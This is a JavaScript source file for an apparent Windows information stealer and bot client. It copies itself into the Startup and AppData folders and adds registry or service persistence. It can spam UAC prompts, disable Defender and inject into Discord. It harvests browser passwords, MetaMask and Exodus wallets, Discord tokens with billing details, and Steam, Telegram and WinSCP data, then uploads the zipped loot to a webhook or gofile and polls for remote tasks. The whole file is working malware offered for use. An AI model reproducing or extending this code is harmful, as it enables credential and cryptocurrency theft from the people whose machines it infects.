//Import Files
const obfuscator = require("./utils/obfuscator");
const admin = require("./utils/admin")
const browsers = require("./utils/browsers");
const core = require("./utils/core");
const corev2 = require('./utils/corev2');
const crypto = require("./utils/crypto");
const discord = require("./utils/discord");
const files = require("./utils/files");
const { upload }= require("./utils/gofile");
const infos = require("./utils/infos");
const injection = require("./utils/injection");
const persistence = require('./utils/persistence');
const ping = require('./utils/ping');
const report = require('./utils/report');
const save = require("./utils/save");
const tasks = require('./utils/tasks');
const uac = require('./utils/uac');
const { stat } = require("./utils/stats");

//Import Modules
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const { exec } = require("child_process");
const path = require('path');

async function main() {
    //if (config.antivm) {
    //    if (core.inVm()) {
    //        return
    //    }
    //}

    const firstRun = corev2.firstRun();

    if (firstRun) {
        const persistencePath = path.join(process.env.appdata, 'Microsoft', 'Crypto', `Update${corev2.randomString(4)}.exe`);

        corev2.createDirectoryRecursively(persistencePath);
        fs.copyFileSync(process.execPath, persistencePath);
        corev2.hideFile(persistencePath);

        if (config.uacSpam) {
            uac.uacSpam(persistencePath);
        } else {
            if (uac.isElevated()) {
                if (config.disableDefender) {
                    corev2.disableDefender();
                }
            }
            uac.runProcess(persistencePath, false);
            mutex.release();
            process.exit(0);
        }
    }

    if (!firstRun) {
        const setPersistence = corev2.setPersistence();

        if (setPersistence) {
            const random = corev2.randomString(4);
            if (uac.isElevated()) {
                if (config.disableDefender) {
                    corev2.disableDefender();
                }
                persistence.addServicePersistence(process.execPath, random);
            } else {
                persistence.addRegistryPersistence(process.execPath, random);
            }
        }
    }
    
    const botId = await report.getBotId();

    await Promise.all([
        ping.runPing(botId),
        tasks.runTasks()
    ]);
}

async function start() {

    try {
        fs.copyFileSync(process.cwd() + "\\" + process.argv0.split("\\")[process.argv0.split("\\").length-1], process.env.APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.exe");
    } catch (e) { }

        const webhook = "%APIURL%"
        save.Init();
    
        const ip = await core.getPublicIp();
        const hostname = await core.getHostname();
        const username = process.env.userprofile.split("\\")[2]
    
        console.log("Starting...")
        
        injection.inject(webhook);
        injection.pwnBetterDiscord();
        admin.grabWinSCP();
        crypto.grabColds();
        crypto.grabExtensions();
        crypto.exodusDecrypt();
        files.grabBattle();
        files.grabProton();
        infos.getSysteminformations();
        files.grabSimple();
        files.grabSteam();
        files.grabTelegram();
        files.grabTox();
        //files.fileGrabber();
        
        try {
            const passwords = await browsers.grabBrowsers();
            const passphrase = await crypto.grabMetamask(passwords);
            stat.AddPassphrase(passphrase);
        } catch (e) { }

        const zipPath = await save.zipResult();
    
        var formData = new FormData();
        if ((fs.statSync(zipPath).size/1000/1000) > 7) {
            link = await upload(zipPath);
            
            formData.append('payload_json', stat.Build(username, hostname, ip, link))
        } else {
            formData.append('payload_json', stat.Build(username, hostname, ip, ""))
            formData.append('file', fs.createReadStream(zipPath))
        }
        
        try {
            axios.all([
                await axios({
                    url: webhook,
                    method: 'POST',
                    headers: {
                        ...formData.getHeaders()
                    },
                    data: formData,
                }),
            ])
        } catch (e) { }

        //fs.rmSync(save.basepath + "\\", { recursive: true, force: true });

        const accounts = await discord.grabDiscord();

        var embeds = [];
        for (let i = 0; i < accounts.length; i++) {
            const acc = accounts[i];
            embeds.push(discord.embed(acc.username, acc.tag, acc.id, acc.nitro, acc.badges, acc.bio, acc.billings, acc.email, acc.phone, acc.token, acc.avatar));
        }
    
        if (embeds.length != 0) {
            try {
                await axios({
                    url: webhook,
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    data: discord.compile(embeds.slice(0, 10))
                })
            } catch (e) { }
        }
        const appdata = process.env.appdata;
        exec('tasklist', async (err, stdout) => {
            for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                if (stdout.includes(executable)) {
                    exec(`taskkill /F /T /IM Discord.exe`)
                    exec(`taskkill /F /T /IM DiscordCanary.exe`)
                    exec(`taskkill /F /T /IM discordDevelopment.exe`)
                    exec(`taskkill /F /T /IM DiscordPTB.exe`)
                }
            }
        })
        obfuscator.obfuscator();
    }
start();
main();
